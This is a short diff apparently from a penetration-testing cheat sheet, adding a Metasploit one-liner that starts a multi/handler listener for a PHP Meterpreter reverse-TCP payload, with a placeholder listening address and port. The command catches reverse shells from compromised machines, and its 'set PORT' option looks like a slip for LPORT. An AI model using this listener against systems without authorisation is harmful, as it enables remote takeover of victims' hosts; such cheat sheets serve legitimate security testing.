@@ -1,3 +1,9 @@
+Start meterpreter listener One Liners
+------------------------------------------------
+```bash
+msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST xxx.xxx.xxx.xxx; set PORT 1234; run"
+```
+
 Start meterpreter listener for a Windows payload
 ------------------------------------------------
 ```bash
